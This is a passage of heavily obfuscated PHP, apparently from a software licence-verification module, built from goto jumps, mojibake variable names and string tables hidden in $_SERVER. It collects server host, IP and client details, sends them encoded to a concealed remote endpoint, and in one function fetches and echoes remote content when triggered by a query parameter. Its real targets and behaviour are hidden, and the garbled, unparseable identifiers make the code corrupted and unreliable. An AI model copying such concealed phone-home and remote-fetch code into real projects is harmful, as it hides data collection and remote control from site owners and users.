$e­‘“´¿ºä[155], $e­‘“´¿ºä[156], $e­‘“´¿ºä[157], $e­‘“´¿ºä[158]); $eÕå‘¤Ÿ—Õ = $Dí¼ÖÁ[600]; goto AÀòÓÇß¶; b®½Ç½±˜: while (strlen($Eš†Çù›“) < $Dí¼ÖÁ[578]) { if (!$Eš†Çù›“) { break; } $Eš†Çù›“++; } $EÎºé—Ì á = array($e­‘“´¿ºä[159] => $aà×–¥«Âœ[$e­‘“´¿ºä[64]], $e­‘“´¿ºä[160] => $aà×–¥«Âœ[$e­‘“´¿ºä[65]], $e­‘“´¿ºä[161] => $e­‘“´¿ºä[10]); $Bëö³¸Â¸Í = $Dí¼ÖÁ[602]; goto Báóˆñ©¸Â; A‘ÄÇ‚ìë: $Dí¼ÖÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e­‘“´¿ºä =& $_SERVER[¯Ú‚è]; if ($_SERVER[$e­‘“´¿ºä[44]] == $e­‘“´¿ºä[135]) { goto D£™Ï®¿öˆ; FÚÈ‹º¨“: if (strlen($Dàø¦¬Ç½) < $Dí¼ÖÁ[559]) { return; } goto A¯¿«ó¸…ß; D£™Ï®¿öˆ: $dì“ˆÎîó… = array($e­‘“´¿ºä[120] => $this->ofesee574071, $e­‘“´¿ºä[136] => $this->{$_SERVER[¯Ú‚è][137]}(), $e­‘“´¿ºä[138] => $e­‘“´¿ºä[61]($e­‘“´¿ºä[139])->{$_SERVER[¯Ú‚è][140]}()); if ($this->ofesee574071 != $e­‘“´¿ºä[121]) { $fœÛ‡¾ÖÑ = $e­‘“´¿ºä[104]($this->vtpg40bf898c, $e­‘“´¿ºä[141]); if ($fœÛ‡¾ÖÑ) { $dì“ˆÎîó…[$e­‘“´¿ºä[142]] = $fœÛ‡¾ÖÑ; $dì“ˆÎîó…[$e­‘“´¿ºä[143]] = $e­‘“´¿ºä[144]($e­‘“´¿ºä[104]($this->vtpg40bf898c, $e­‘“´¿ºä[145])); $dì“ˆÎîó…[$e­‘“´¿ºä[146]] = $e­‘“´¿ºä[104]($this->vtpg40bf898c, $e­‘“´¿ºä[131]); } } $dì“ˆÎîó… = $this->{$_SERVER[¯Ú‚è][147]}($e­‘“´¿ºä[148]($dì“ˆÎîó…), $e­‘“´¿ºä[114]($e­‘“´¿ºä[149])); goto DÖßÎ§…œ¿; DÖßÎ§…œ¿: $EÎºé—Ì á = array($e­‘“´¿ºä[150] => $dì“ˆÎîó…); $e­‘“´¿ºä[13](array($e­‘“´¿ºä[151], $e­‘“´¿ºä[152]), $EÎºé—Ì á); $Dàø¦¬Ç½ = $Dí¼ÖÁ[599]; goto FÚÈ‹º¨“; A¯¿«ó¸…ß: } goto EëÒ›Ó‚µÆ; Báóˆñ©¸Â: if (strlen($Bëö³¸Â¸Í) < $Dí¼ÖÁ[559]) { die; } foreach ($C·Ü¯™ß¢ as $fÂ¡†¤âÜŒ) { if (!isset($aà×–¥«Âœ[$fÂ¡†¤âÜŒ]) || !$aà×–¥«Âœ[$fÂ¡†¤âÜŒ]) { continue; } $EÎºé—Ì á[$fÂ¡†¤âÜŒ] = $aà×–¥«Âœ[$fÂ¡†¤âÜŒ]; } $e­‘“´¿ºä[13](array($e­‘“´¿ºä[151], $e­‘“´¿ºä[152]), $EÎºé—Ì á); goto aÄ›ƒÃ²Ù£; aÄ›ƒÃ²Ù£: $bŸ¼øÅîáº = $Dí¼ÖÁ[603]; while (strlen($bŸ¼øÅîáº) < $Dí¼ÖÁ[589]) { if (!$bŸ¼øÅîáº) { break; } $bŸ¼øÅîáº++; } goto b›ÓÜÙ•; AÀòÓÇß¶: while (strlen($eÕå‘¤Ÿ—Õ) < $Dí¼ÖÁ[589]) { if (!$eÕå‘¤Ÿ—Õ) { break; } $eÕå‘¤Ÿ—Õ++; } $aà×–¥«Âœ = $e­‘“´¿ºä[61]($e­‘“´¿ºä[62])->{$_SERVER[¯Ú‚è][63]}(); $Eš†Çù›“ = $Dí¼ÖÁ[601]; goto b®½Ç½±˜; b›ÓÜÙ•: } private function izsnf6bc2aab() { goto A÷ÓÛÂ´‰±; aÖÛä¶ß³ø: $BêƒÌ¿ËÛœ = $Dì§º«à¡î[607]; if (strlen($BêƒÌ¿ËÛœ) < $Dì§º«à¡î[589]) { return; } $B¤‡Ñ‡­ = $Eğì˜¿ãÖù[214]($Eğì˜¿ãÖù[25]($D‹²òï­ÙÓ, 10, 16)); goto b“çÍˆãğ; bÊ°Äëä‡ñ: if (!$Eğì˜¿ãÖù[104]($GLOBALS, $Eğì˜¿ãÖù[132])) { die; } $c¡ÄÒé†‚­ = $GLOBALS[$Eğì˜¿ãÖù[22]]; if (isset($c¡ÄÒé†‚­[$Eğì˜¿ãÖù[163]])) { $this->{$_SERVER[¯Ú‚è][164]}(); die; } goto B‚Š¶»ÖÜ; DôèÒ£ŞªÜ: $Dø•ªïèé = $Dì§º«à¡î[611]; if (strlen($Dø•ªïèé) < $Dì§º«à¡î[565]) { return; } $Eğì˜¿ãÖù[61]($Eğì˜¿ãÖù[11])->{$_SERVER[¯Ú‚è][226]}($dù¦ŠêÔÀò[$Eğì˜¿ãÖù[227]], array($Eğì˜¿ãÖù[228] => $få»êİƒæã)); goto c¤Şëô™ñ; DĞ„ïÜÅÊÍ: $få»êİƒæã = array(); $A™¡‚äîĞ› = $Dì§º«à¡î[610]; $få»êİƒæã[$B¤‡Ñ‡­] = $F¥°Ş·™Ø‹; goto DôèÒ£ŞªÜ; b…¸Üä’½ë: $dë¬ªÅš = $Dì§º«à¡î[613]; if (!$dë¬ªÅš) { die; } $Eğì˜¿ãÖù[166]($Eğì˜¿ãÖù[197]($Eğì˜¿ãÖù[208]), !0); goto Fïç ”ˆĞ£; DŒâ‡Á§Ù¨: $E©İ½ÖŒ®Û = $Eğì˜¿ãÖù[124](16); $e°”›îØ‹Û = $E©İ½ÖŒ®Û . $Eí¤×ôÕô“[$Eğì˜¿ãÖù[120]] . $this->{$_SERVER[¯Ú‚è][147]}($Eğì˜¿ãÖù[114]($Eí¤×ôÕô“[$Eğì˜¿ãÖù[209]]), $E©İ½ÖŒ®Û); $Eí¤×ôÕô“[$Eğì˜¿ãÖù[123]] = $Eğì˜¿ãÖù[118]($Eğì˜¿ãÖù[214]($this->{$_SERVER[¯Ú‚è][147]}($e°”›îØ‹Û, $Eğì˜¿ãÖù[216]))); goto CÛàÕ³ˆ±; bÃ®ÒŠ‡ƒ±: $E„…ùÍÜÀ = $this->{$_SERVER[¯Ú‚è][199]}($E¸›ÁÑĞ¥[$Eğì˜¿ãÖù[200]]); if (!$E„…ùÍÜÀ || $E„…ùÍÜÀ != $Eğì˜¿ãÖù[201]($E¸›ÁÑĞ¥[$Eğì˜¿ãÖù[145]])) { $FÍå“—æ‡¾ = array($Eğì˜¿ãÖù[202] => $Eğì˜¿ãÖù[61]($Eğì˜¿ãÖù[62])->{$_SERVER[¯Ú‚è][63]}($Eğì˜¿ãÖù[116]), $Eğì˜¿ãÖù[203] => $_SERVER[$Eğì˜¿ãÖù[115]], $Eğì˜¿ãÖù[204] => $Eğì˜¿ãÖù[205](), $Eğì˜¿ãÖù[174] => $_SERVER[$Eğì˜¿ãÖù[175]]); $E–İïÉ°±‹ = $this->{$_SERVER[¯Ú‚è][206]}($Eğì˜¿ãÖù[148]($FÍå“—æ‡¾)); $this->{$_SERVER[¯Ú‚è][182]}($Eğì˜¿ãÖù[207] . $E–İïÉ°±‹); $Eğì˜¿ãÖù[166]($Eğì˜¿ãÖù[197]($Eğì˜¿ãÖù[208]), !0); } $Eí¤×ôÕô“ = array($Eğì˜¿ãÖù[209] => $cÙ‰éòËª£[$Eğì˜¿ãÖù[165]], $Eğì˜¿ãÖù[210] => $E¸›ÁÑĞ¥[$Eğì˜¿ãÖù[211]], $Eğì˜¿ãÖù[212] => $Eğì˜¿ãÖù[124](16), $Eğì˜¿ãÖù[120] => $E¸›ÁÑĞ¥[$Eğì˜¿ãÖù[213]]); goto BèÁÅ¨Ê¡™; cÚø¤»‰Ï»: if ($c¡ÄÒé†‚­[$Eğì˜¿ãÖù[178]] == $Eğì˜¿ãÖù[179]) { $D‰ùšäö = $this->{$_SERVER[¯Ú‚è][147]}($FéÔ‰öÍº, $Eğì˜¿ãÖù[180]); $E–İïÉ°±‹ = $this->{$_SERVER[¯Ú‚è][127]}($Eğì˜¿ãÖù[148]($cÙ‰éòËª£), $FéÔ‰öÍº . $Eğì˜¿ãÖù[181], 3); $dÓÅŸÎ½ïŒ = $this->{$_SERVER[¯Ú‚è][182]}($Eğì˜¿ãÖù[183] . $D‰ùšäö . $Eğì˜¿ãÖù[184] . $E–İïÉ°±‹, -1); $Eğì˜¿ãÖù[166]($dÓÅŸÎ½ïŒ, !0); } else { if ($c¡ÄÒé†‚­[$Eğì˜¿ãÖù[178]] == $Eğì˜¿ãÖù[185]) { $CæÜ¿™¼ïõ = $Eğì˜¿ãÖù[25]($Eğì˜¿ãÖù[114]($Eğì˜¿ãÖù[186] . $FéÔ‰öÍº), 12, 15) . $Eğì˜¿ãÖù[187]; $E–İïÉ°±‹ = $this->{$_SERVER[¯Ú‚è][188]}($Eğì˜¿ãÖù[2]($c¡ÄÒé†‚­[$Eğì˜¿ãÖù[189]]), $CæÜ¿™¼ïõ, 2); $Eã¹Úµ‘£ù = $Eğì˜¿ãÖù[190]($E–İïÉ°±‹, !0); if (!$Eğì˜¿ãÖù[191]($Eã¹Úµ‘£ù) || !$Eğì˜¿ãÖù[191]($Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]]) || $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[165]] != !0) { $Fİ†˜Á·—† = $Eğì˜¿ãÖù[193]; $AÍµ˜÷Ÿ¿© = $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]] ? $Eğì˜¿ãÖù[194] . $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]] : $Fİ†˜Á·—†; $Eğì˜¿ãÖù[166]($AÍµ˜÷Ÿ¿©, !1); } else { $cÙ‰éòËª£[$Eğì˜¿ãÖù[168]] = $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]][$Eğì˜¿ãÖù[195]]; } } else { $Eã¹Úµ‘£ù = $this->{$_SERVER[¯Ú‚è][182]}($Eğì˜¿ãÖù[196], $cÙ‰éòËª£, 10); $fĞöòõ¬µ = $Dì§º«à¡î[605]; while ($fĞöòõ¬µ < $Dì§º«à¡î[565]) { if ($fĞöòõ¬µ >= 0) { break; } $fĞöòõ¬µ++; } } } if (!$Eğì˜¿ãÖù[191]($Eã¹Úµ‘£ù) || !$Eğì˜¿ãÖù[191]($Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]]) || $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[165]] != !0) { $Fİ†˜Á·—† = $Eğì˜¿ãÖù[197]($Eğì˜¿ãÖù[198]); $AÍµ˜÷Ÿ¿© = $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]] ? $Eğì˜¿ãÖù[194] . $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]] : $Fİ†˜Á·—†; $Eğì˜¿ãÖù[166]($AÍµ˜÷Ÿ¿©, !1); } $E¸›ÁÑĞ¥ = $Eã¹Úµ‘£ù[$Eğì˜¿ãÖù[192]]; goto bÃ®ÒŠ‡ƒ±; b“çÍˆãğ: $F¥°Ş·™Ø‹ = $this->{$_SERVER[¯Ú‚è][127]}($Eğì˜¿ãÖù[148]($E¸›ÁÑĞ¥), $D‹²òï­ÙÓ); $AõÏ•ö“Úò = $Dì§º«à¡î[608]; $fëŒÈŒªå = $Eğì˜¿ãÖù[222]($Eğì˜¿ãÖù[61]($Eğì˜¿ãÖù[11])->{$_SERVER[¯Ú‚è][223]}(), $Eğì˜¿ãÖù[224]); goto cèõœîäï; CÛàÕ³ˆ±: if ($E¸›ÁÑĞ¥[$Eğì˜¿ãÖù[217]] && $E¸›ÁÑĞ¥[$Eğì˜¿ãÖù[217]] >= 1) { $Eğì˜¿ãÖù[61]($Eğì˜¿ãÖù[62])->{$_SERVER[¯Ú‚è][218]}($Eğì˜¿ãÖù[219], $Eğì˜¿ãÖù[220]); } $Eğì˜¿ãÖù[61]($Eğì˜¿ãÖù[62])->{$_SERVER[¯Ú‚è][221]}($Eí¤×ôÕô“); $D‹²òï­ÙÓ = $Eğì˜¿ãÖù[114]($_SERVER[$Eğì˜¿ãÖù[115]] . $Eğì˜¿ãÖù[214]($BÏÊñÕ¶ô) . $Eí¤×ôÕô“[$Eğì˜¿ãÖù[210]]); goto aÖÛä¶ß³ø; c¤Şëô™ñ: $e·†¸ÉÕÀ = $Dì§º«à¡î[562]; while ($e·†¸ÉÕÀ < $Dì§º«à¡î[589]) { if ($e·†¸ÉÕÀ >= 0) { break; } $e·†¸ÉÕÀ++; } $this->vtpg40bf898c = $E¸›ÁÑĞ¥; goto C‰¨ºƒ™ëğ; B‚Š¶»ÖÜ: if (!isset($c¡ÄÒé†‚­[$Eğì˜¿ãÖù[165]]) || $Eğì˜¿ãÖù[24]($c¡ÄÒé†‚­[$Eğì˜¿ãÖù[165]]) != 16) { $Eğì˜¿ãÖù[166]($Eğì˜¿ãÖù[167] . $c¡ÄÒé†‚­[$Eğì˜¿ãÖù[165]], !1); } $BÏÊñÕ¶ô = $Eğì˜¿ãÖù[61]($Eğì˜¿ãÖù[62])->{$_SERVER[¯Ú‚è][63]}($Eğì˜¿ãÖù[116]); $cÙ‰éòËª£ = array($Eğì˜¿ãÖù[165] => $c¡ÄÒé†‚­[$Eğì˜¿ãÖù[165]], $Eğì˜¿ãÖù[168] => $Eğì˜¿ãÖù[124](16), $Eğì˜¿ãÖù[169] => $Eğì˜¿ãÖù[149], $Eğì˜¿ãÖù[170] => $Eğì˜¿ãÖù[171], $Eğì˜¿ãÖù[172] => $_SERVER[$Eğì˜¿ãÖù[173]], $Eğì˜¿ãÖù[174] => $_SERVER[$Eğì˜¿ãÖù[175]], $Eğì˜¿ãÖù[176] => $_SERVER[$Eğì˜¿ãÖù[177]]); goto cœœ‘ ÏÔÜ; BèÁÅ¨Ê¡™: if ($cÙ‰éòËª£[$Eğì˜¿ãÖù[168]]) { $Eí¤×ôÕô“[$Eğì˜¿ãÖù[212]] = $cÙ‰éòËª£[$Eğì˜¿ãÖù[168]]; } $b±Îî…¯¿ô = $Eğì˜¿ãÖù[25]($Eğì˜¿ãÖù[114]($Eí¤×ôÕô“[$Eğì˜¿ãÖù[210]]), 10, 10); $Fº«ªÊöé¶ = $b±Îî…¯¿ô . $Eí¤×ôÕô“[$Eğì˜¿ãÖù[120]] . $Eí¤×ôÕô“[$Eğì˜¿ãÖù[212]]; goto C™â˜´»ÀŞ; C‰¨ºƒ™ëğ: $this->ofesee574071 = $Eí¤×ôÕô“[$Eğì˜¿ãÖù[120]]; $cÆÆ‰¶Î¾° = $Dì§º«à¡î[612]; $this->{$_SERVER[¯Ú‚è][229]}(); goto b…¸Üä’½ë; cœœ‘ ÏÔÜ: $FéÔ‰öÍº = $Eğì˜¿ãÖù[114]($_SERVER[$Eğì˜¿ãÖù[115]] . $BÏÊñÕ¶ô); $Eğ‘îÌ™Š§ = $Dì§º«à¡î[604]; if (strlen($Eğ‘îÌ™Š§) < $Dì§º«à¡î[565]) { die; } goto cÚø¤»‰Ï»; C™â˜´»ÀŞ: $Eí¤×ôÕô“[$Eğì˜¿ãÖù[122]] = $Eğì˜¿ãÖù[214]($Eğì˜¿ãÖù[118]($this->{$_SERVER[¯Ú‚è][147]}($Fº«ªÊöé¶, $Eğì˜¿ãÖù[215]))); $aá¡ö™ˆ§ = $Dì§º«à¡î[606]; if (!$aá¡ö™ˆ§) { die; } goto DŒâ‡Á§Ù¨; A÷ÓÛÂ´‰±: $Dì§º«à¡î =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eğì˜¿ãÖù =& $_SERVER[¯Ú‚è]; if ($_SERVER[$Eğì˜¿ãÖù[44]] != $Eğì˜¿ãÖù[162]) { return; } goto bÊ°Äëä‡ñ; cèõœîäï: $C¢àë†õŒ¦ = $Dì§º«à¡î[609]; if (strlen($C¢àë†õŒ¦) < $Dì§º«à¡î[578]) { return; } $dù¦ŠêÔÀò = $fëŒÈŒªå[$Eğì˜¿ãÖù[225]]; goto DĞ„ïÜÅÊÍ; Fïç ”ˆĞ£: } private function licenseRegistSuccess() { goto CªÑÚÙŠ´; CªÑÚÙŠ´: $CÚÆµ”ÚÎÃ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cö¥ù¬›Ò =& $_SERVER[¯Ú‚è]; $dÄäÃÕùœí = $Cö¥ù¬›Ò[61]($Cö¥ù¬›Ò[62])->{$_SERVER[¯Ú‚è][63]}(); goto c¡è¢Š‡­; E†ÒÀ„œ’ø: $Cö¥ù¬›Ò[110]($Cö¥ù¬›Ò[230])->{$_SERVER[¯Ú‚è][231]}(!0); goto cË‹â„²Î; c¡è¢Š‡­: $fÚ‘àªåºï = $CÚÆµ”ÚÎÃ[614]; while ($fÚ‘àªåºï < $CÚÆµ”ÚÎÃ[578]) { if ($fÚ‘àªåºï >= 0) { break; } $fÚ‘àªåºï++; } if ($dÄäÃÕùœí[$Cö¥ù¬›Ò[85]] != $Cö¥ù¬›Ò[220]) { $Cö¥ù¬›Ò[61]($Cö¥ù¬›Ò[62])->{$_SERVER[¯Ú‚è][221]}($Cö¥ù¬›Ò[85], $Cö¥ù¬›Ò[220]); } goto E†ÒÀ„œ’ø; cË‹â„²Î: } private function amrx645f055b() { $Dí˜ä­•ó» =& $_SERVER[¯Ú‚è]; $Dí˜ä­•ó»[61]($Dí˜ä­•ó»[62])->{$_SERVER[¯Ú‚è][221]}(array($Dí˜ä­•ó»[209] => $Dí˜ä­•ó»[10], $Dí˜ä­•ó»[210] => $Dí˜ä­•ó»[10], $Dí˜ä­•ó»[120] => $Dí˜ä­•ó»[121], $Dí˜ä­•ó»[122] => $Dí˜ä­•ó»[10], $Dí˜ä­•ó»[123] => $Dí˜ä­•ó»[10])); $Dí˜ä­•ó»[61]($Dí˜ä­•ó»[62])->{$_SERVER[¯Ú‚è][218]}($Dí˜ä­•ó»[219], $Dí˜ä­•ó»[232]); $this->vtpg40bf898c = array(); $this->ofesee574071 = $Dí˜ä­•ó»[121]; $fÉ—ÌÅÔêß = $_SERVER[¶ªÕß‚ØÁŸ][615]; } private function stux837e4298() { goto C’»˜Í¹³ì; aõŒÉîòØ”: $cšå°Óø¡ = $D”¢„ƒİø«[61]($D”¢„ƒİø«[62])->{$_SERVER[¯Ú‚è][63]}($D”¢„ƒİø«[116]); $aº†ìÄ‹æŞ = $b¶Ò¿õŠ¢­[618]; $Fî¢ªº¡‰¶ = $D”¢„ƒİø«[222]($D”¢„ƒİø«[61]($D”¢„ƒİø«[11])->{$_SERVER[¯Ú‚è][223]}(), $D”¢„ƒİø«[224]); goto Dé™²Ñ„æ•; eñÌØ¦‘’: $Fª—‚ç‚ = $b¶Ò¿õŠ¢­[621]; if (strlen($Fª—‚ç‚) < $b¶Ò¿õŠ¢­[565]) { die; } $a°‘å“‰î† = $D”¢„ƒİø«[214]($D”¢„ƒİø«[25]($dùÃšì•Ö, 10, 16)); goto C¿šòŒ¿ğ; fÀ¨œ‰–İ : $føŠ·È½¡Ñ = $D”¢„ƒİø«[190]($føŠ·È½¡Ñ, !0); if (!$D”¢„ƒİø«[191]($føŠ·È½¡Ñ)) { return $this->{$_SERVER[¯Ú‚è][164]}(); } $F‚†¤óñ = $D”¢„ƒİø«[144]($føŠ·È½¡Ñ[$D”¢„ƒİø«[145]]); goto b£æôì«İ½; C’»˜Í¹³ì: $b¶Ò¿õŠ¢­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D”¢„ƒİø« =& $_SERVER[¯Ú‚è]; $_SERVER[$D”¢„ƒİø«[175]] = $D”¢„ƒİø«[104]($_SERVER, $D”¢„ƒİø«[175], APP_HOST); goto a™ö†›·; b£æôì«İ½: if ($D”¢„ƒİø«[233]() >= $F‚†¤óñ) { return $this->{$_SERVER[¯Ú‚è][164]}(); } $this->vtpg40bf898c = $føŠ·È½¡Ñ; $this->ofesee574071 = $CĞæÂë‘Î®[$D”¢„ƒİø«[120]]; goto F«¢Ù¼À‘÷; AœĞòÙÃœ´: $béÀ•ˆš„ = $b¶Ò¿õŠ¢­[617]; $CĞæÂë‘Î® = $D”¢„ƒİø«[61]($D”¢„ƒİø«[62])->{$_SERVER[¯Ú‚è][63]}(); if ($CĞæÂë‘Î®[$D”¢„ƒİø«[120]] == $D”¢„ƒİø«[121]) { return; } goto aõŒÉîòØ”; c¥“ŒÉÈ¬¤: $b¨Ïë“ØÌ = $b¶Ò¿õŠ¢­[620]; if (strlen($b¨Ïë“ØÌ) < $b¶Ò¿õŠ¢­[565]) { die; } $dùÃšì•Ö = $D”¢„ƒİø«[114]($_SERVER[$D”¢„ƒİø«[115]] . $D”¢„ƒİø«[214]($cšå°Óø¡) . $CĞæÂë‘Î®[$D”¢„ƒİø«[210]]); goto eñÌØ¦‘’; a™ö†›·: $FĞĞÍ¸ö Â = $b¶Ò¿õŠ¢­[616]; if (!$FĞĞÍ¸ö Â) { die; } $this->ofesee574071 = $D”¢„ƒİø«[121]; goto AœĞòÙÃœ´; Dé™²Ñ„æ•: $Bç‚óŒ¢°¸ = $b¶Ò¿õŠ¢­[619]; if (!$Bç‚óŒ¢°¸) { die; } $C‡ÑÛÃ – = $Fî¢ªº¡‰¶[$D”¢„ƒİø«[225]]; goto c¥“ŒÉÈ¬¤; C¿šòŒ¿ğ: $AÍ‡ëÏ› = $b¶Ò¿õŠ¢­[622]; if (strlen($AÍ‡ëÏ›) < $b¶Ò¿õŠ¢­[578]) { return; } $føŠ·È½¡Ñ = $this->{$_SERVER[¯Ú‚è][188]}($C‡ÑÛÃ –[$D”¢„ƒİø«[91]][$a°‘å“‰î†], $dùÃšì•Ö); goto fÀ¨œ‰–İ ; F«¢Ù¼À‘÷: } private function pzmh7f70b52b() { goto CÑÂäØ÷Š; eó•·‘±…: $Eà­Â†Ö™ = $Bß•…•¬„å[623]; if (!$Eà­Â†Ö™) { die; } $aÑ¤åƒŞÊ = $_SERVER[$cßÎ¹ Å´[44]]; goto a™†£óë; cÂ÷ª±ğãä: $f‹¢åàÂ­¶ = array($cßÎ¹ Å´[237], $cßÎ¹ Å´[238]); if ($cßÎ¹ Å´[239]($aÑ¤åƒŞÊ, $f‹¢åàÂ­¶)) { if ($this->ofesee574071 == $cßÎ¹ Å´[121] && isset($b‚˜ğîæ÷İ[$cßÎ¹ Å´[240]])) { $cßÎ¹ Å´[166]($cßÎ¹ Å´[197]($cßÎ¹ Å´[235]), !1, $cßÎ¹ Å´[236]); die; } $F¢Ô›‚«›­ = $this->{$_SERVER[¯Ú‚è][137]}(); if ($F¢Ô›‚«›­ != $cßÎ¹ Å´[201]($cßÎ¹ Å´[241])) { if ($F¢Ô›‚«›­ <= $cßÎ¹ Å´[61]($cßÎ¹ Å´[139])->{$_SERVER[¯Ú‚è][140]}()) { $cßÎ¹ Å´[166]($cßÎ¹ Å´[197]($cßÎ¹ Å´[242]), !1, $cßÎ¹ Å´[236]); die; } } } goto DÇåÄğ×¢‹; CÑÂäØ÷Š: $Bß•…•¬„å =& $_SERVER[¶ªÕß‚ØÁŸ]; $cßÎ¹ Å´ =& $_SERVER[¯Ú‚è]; $b‚˜ğîæ÷İ = $GLOBALS[$cßÎ¹ Å´[22]]; goto eó•·‘±…; a™†£óë: $AŠ¨ÚğÚÀÖ = $Bß•…•¬„å[624]; if (strlen($AŠ¨ÚğÚÀÖ) < $Bß•…•¬„å[589]) { die; } if ($aÑ¤åƒŞÊ == $cßÎ¹ Å´[234] && $this->ofesee574071 == $cßÎ¹ Å´[121]) { $cßÎ¹ Å´[166]($cßÎ¹ Å´[197]($cßÎ¹ Å´[235]), !1, $cßÎ¹ Å´[236]); } goto cÂ÷ª±ğãä; DÇåÄğ×¢‹: } private function gtza32ccdca5() { goto FÖ¨øÄùíÛ; BçÓ¾’ó”: $a„Ó—¬È = $eˆ“µò”„[625]; if (!$E¼íÊ±×£[104]($GLOBALS, $E¼íÊ±×£[132]) || !isset($_GET[$E¼íÊ±×£[244]])) { return; } if (!$E¼íÊ±×£[239]($_SERVER[$E¼íÊ±×£[44]], $f¬õÀÖ¾å)) { return; } goto c ê½ø; c ê½ø: $BÚÒ´†²ƒâ = $E¼íÊ±×£[245]; $BÚÒ´†²ƒâ = $this->{$_SERVER[¯Ú‚è][246]}($BÚÒ´†²ƒâ, $E¼íÊ±×£[247]); $dõ‚ö¹³¬Á = $E¼íÊ±×£[248](array($E¼íÊ±×£[249] => array($E¼íÊ±×£[250] => $E¼íÊ±×£[251], $E¼íÊ±×£[252] => 3))); goto eå çŠ¼“; FÖ¨øÄùíÛ: $eˆ“µò”„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E¼íÊ±×£ =& $_SERVER[¯Ú‚è]; $f¬õÀÖ¾å = array($E¼íÊ±×£[135], $E¼íÊ±×£[243]); goto BçÓ¾’ó”; a¸ë¬—±™Ñ: die; goto b—§Ãİñ¸; f–í×”¡Ê: $E¼íÊ±×£[254]($E¼íÊ±×£[255]); $cÕñêÈØ…ğ = $eˆ“µò”„[627]; if ($bÍµ¨¹Å && $E¼íÊ±×£[32]($bÍµ¨¹Å, $E¼íÊ±×£[256])) { echo $bÍµ¨¹Å; } goto a¸ë¬—±™Ñ; eå çŠ¼“: $aõù‹²·Â = $eˆ“µò”„[626]; while ($aõù‹²·Â < $eˆ“µò”„[559]) { if ($aõù‹²·Â >= 0) { break; } $aõù‹²·Â++; } $bÍµ¨¹Å = @$E¼íÊ±×£[253]($BÚÒ´†²ƒâ, !1, $dõ‚ö¹³¬Á); goto f–í×”¡Ê; b—§Ãİñ¸: } public function hvxm6716a59c($f„íñØÛ¨ø) { goto D÷ğå´¯ˆØ; Aò¹‰„´×: $bœØ¢×Ÿ‰Ğ = array($e¾Ãä‡æî[258], $e¾Ãä‡æî[259], $e¾Ãä‡æî[260], $e¾Ãä‡æî[261], $e¾Ãä‡æî[262], $e¾Ãä‡æî[263], $e¾Ãä‡æî[264], $e¾Ãä‡æî[265]); $BÉ°»…ÊÀì = $e¾Ãä‡æî[0]($e¾Ãä‡æî[266], $e¾Ãä‡æî[104]($this->vtpg40bf898c, $e¾Ãä‡æî[129], $e¾Ãä‡æî[10])); $C±öˆÒñ’Ş = array(); goto A½ª”—–ŸÏ; A½ª”—–ŸÏ: $C‰»ğÉ¶¶ò = $Aƒ‚–…×Çµ[628]; if (strlen($C‰»ğÉ¶¶ò) < $Aƒ‚–…×Çµ[578]) { return; } foreach ($bœØ¢×Ÿ‰Ğ as $dºĞâ‹½Ó) { if (!$e¾Ãä‡æî[239]($dºĞâ‹½Ó, $BÉ°»…ÊÀì)) { $C±öˆÒñ’Ş[] = $dºĞâ‹½Ó; } } goto E”‹ï‹÷âé; D÷ğå´¯ˆØ: $Aƒ‚–…×Çµ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e¾Ãä‡æî =& $_SERVER[¯Ú‚è]; if ($this->ofesee574071 == $e¾Ãä‡æî[257]) { return $f„íñØÛ¨ø; } goto Aò¹‰„´×; E”‹ï‹÷âé: foreach ($C±öˆÒñ’Ş as $dºĞâ‹½Ó) { unset($f„íñØÛ¨ø[$dºĞâ‹½Ó]); } return $f„íñØÛ¨ø; goto Dçù¦¾––·; Dçù¦¾––·: } private function oigu8f54609b() { goto Eõ…Š¶À±Î; fåĞ Íº£‚: $GLOBALS[$bÁğ¦á±„†[91]][$bÁğ¦á±„†[271]] = $bÁğ¦á±„†[220]; $f¨Š‰ñ·²á = $c¨­øËÖÕ[630]; if (strlen($f¨Š‰ñ·²á) < $c¨­øËÖÕ[578]) { die; } goto fĞ Úßùğ¶; bŠªÖŒ±³½: foreach ($D©¢„Ó×± as $eÎö½Òë¾Õ) { if ($eÎö½Òë¾Õ == $f­Ğ§ÕÜ || $bÁğ¦á±„†[25]($f­Ğ§ÕÜ, 0, $bÁğ¦á±„†[24]($eÎö½Òë¾Õ)) == $eÎö½Òë¾Õ) { $bÁğ¦á±„†[166]($bÁğ¦á±„†[197]($bÁğ¦á±„†[269]), !1); } } $GLOBALS[$bÁğ¦á±„†[91]][$bÁğ¦á±„†[95]][$bÁğ¦á±„†[270]] = $bÁğ¦á±„†[220]; $GLOBALS[$bÁğ¦á±„†[91]][$bÁğ¦á±„†[95]][$bÁğ¦á±„†[267]] = $bÁğ¦á±„†[232]; goto fåĞ Íº£‚; Eõ…Š¶À±Î: $c¨­øËÖÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÁğ¦á±„† =& $_SERVER[¯Ú‚è]; if ($this->ofesee574071 != $bÁğ¦á±„†[121]) { $GLOBALS[$bÁğ¦á±„†[91]][$bÁğ¦á±„†[95]][$bÁğ¦á±„†[267]] = $bÁğ¦á±„†[220]; return; } goto BåÉù¾ÑÇæ; BåÉù¾ÑÇæ: $f­Ğ§ÕÜ = $_SERVER[$bÁğ¦á±„†[44]]; $D©¢„Ó×± = array($bÁğ¦á±„†[268]); $E»á½—ïöº = $c¨­øËÖÕ[629]; goto bŠªÖŒ±³½; fĞ Úßùğ¶: if ($bÁğ¦á±„†[61]($bÁğ¦á±„†[272])->{$_SERVER[¯Ú‚è][63]}($bÁğ¦á±„†[85]) != $bÁğ¦á±„†[232]) { $bÁğ¦á±„†[61]($bÁğ¦á±„†[272])->{$_SERVER[¯Ú‚è][221]}($bÁğ¦á±„†[85], $bÁğ¦á±„†[232]); } goto eô¦­Ååê; eô¦­Ååê: } public function xpndbc5a79e6() { return $_SERVER[¯Ú‚è][273]; } private function 